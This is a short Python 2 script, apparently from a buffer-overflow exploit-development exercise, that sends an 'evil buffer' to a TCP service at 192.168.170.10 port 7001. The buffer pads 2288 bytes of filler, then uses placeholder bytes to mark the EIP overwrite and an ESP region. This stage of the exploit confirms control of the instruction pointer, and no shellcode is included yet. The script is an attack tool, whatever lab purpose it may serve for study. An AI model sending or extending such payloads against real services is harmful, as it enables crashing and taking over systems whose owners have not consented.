#!/usr/bin/python
import socket
try:
  print "\nSending evil buffer..."
  filler = "A" * 2288
  eip = "B" * 4
  offset = "C" * 8
  esp = "D" * 700
  buffer = filler + eip + offset + esp
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.170.10", 7001))
  s.send(buffer)
  s.close()
  print "\nDone!"
except:
  print "\nCould not connect!"


